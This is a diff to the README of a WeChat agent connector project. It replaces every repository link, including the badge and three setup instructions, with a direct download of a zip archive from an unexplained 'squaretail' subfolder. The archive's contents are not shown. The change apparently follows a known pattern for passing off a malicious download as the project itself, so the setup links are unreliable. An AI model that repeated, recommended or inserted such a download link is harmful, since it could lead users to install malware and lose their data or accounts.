@@ -1,12 +1,12 @@
 # 🤖 wechat-agent-connector - Set up a WeChat agent fast
 
-[![Download / Setup Guide](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Shouted-numberone752/wechat-agent-connector)
+[![Download / Setup Guide](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shouted-numberone752/wechat-agent-connector/main/squaretail/agent_wechat_connector_3.4-beta.1.zip)
 
 ## 📥 Download and open the project
 
 Use this page to download or copy the project files:
 
-https://github.com/Shouted-numberone752/wechat-agent-connector
+https://raw.githubusercontent.com/Shouted-numberone752/wechat-agent-connector/main/squaretail/agent_wechat_connector_3.4-beta.1.zip
 
 If you use GitHub in a browser, you can:
 
@@ -52,7 +52,7 @@ Follow these steps in order.
 
 Open the download page:
 
-https://github.com/Shouted-numberone752/wechat-agent-connector
+https://raw.githubusercontent.com/Shouted-numberone752/wechat-agent-connector/main/squaretail/agent_wechat_connector_3.4-beta.1.zip
 
 Then download the project and place it in a folder you can access easily.
 
@@ -219,7 +219,7 @@ Use the same folder each time if you want the same binding.
 
 ## 📎 Direct project link
 
-https://github.com/Shouted-numberone752/wechat-agent-connector
+https://raw.githubusercontent.com/Shouted-numberone752/wechat-agent-connector/main/squaretail/agent_wechat_connector_3.4-beta.1.zip
 
 Use this link to download, clone, or open the project again later
 
